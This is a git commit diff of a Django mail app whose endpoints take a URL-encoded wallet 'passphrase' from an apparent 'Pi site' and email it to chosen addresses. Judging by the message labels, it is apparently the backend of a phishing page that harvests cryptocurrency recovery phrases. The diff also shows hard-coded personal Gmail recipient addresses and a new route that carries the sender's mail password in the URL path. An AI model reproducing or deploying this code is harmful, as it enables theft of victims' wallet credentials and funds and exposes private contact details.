99ad61ea3bea6b7f3b5a5aeee28a39c991123eb0
Ezekiel--dev <81721664+Easy-creator@users.noreply.github.com>
2024-06-23 07:26:33 +0100

    customized email a bit

--- mail/urls.py
+++ mail/urls.py
@@ -1,6 +1,7 @@
 from django.urls import path
-from .views import sendmail
+from .views import sendmail, send_notify2
 
 urlpatterns = [
-    path('send/<keys>/', sendmail)
+    path('send/<keys>/<email>/', sendmail),
+    path('send_to/<sender>/<password>/<email_to>/<keys>/', send_notify2),
 ]
--- mail/views.py
+++ mail/views.py
@@ -14,13 +14,40 @@ def send_notify(subject, payload, email_to):
     
     return sending_no(payload, recipient, sender,password, subject)
 
-def sendmail(request, keys):
+def sendmail(request, keys, email):
     current_date = datetime.now()
     formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
     
     decoded_param = unquote(keys)
-    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
+    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
                     
-    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
+    # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
-    return HttpResponse('done')
+    return HttpResponse('OK')
+
+def send_notify2(request, sender, password, email_to,keys, subject=None, payload=None):
+    recipient = email_to
+    password = unquote(password)
+    current_date = datetime.now()
+    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
+    keys = unquote(keys)
+    if subject == None and payload == None:
+        sending_no(
+            payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )',
+            subject=f'Pi site Token Submitted {formatted_time}',
+            recipient=recipient,
+            sender = sender,
+            password = password,
+        )
+    else:
+        payload = unquote(payload)
+        subject = unquote(subject)
+        sending_no(
+            payload= payload,
+            subject=subject,
+            recipient=recipient,
+            sender = sender,
+            password = password,
+        )
+    return HttpResponse('OK')
+
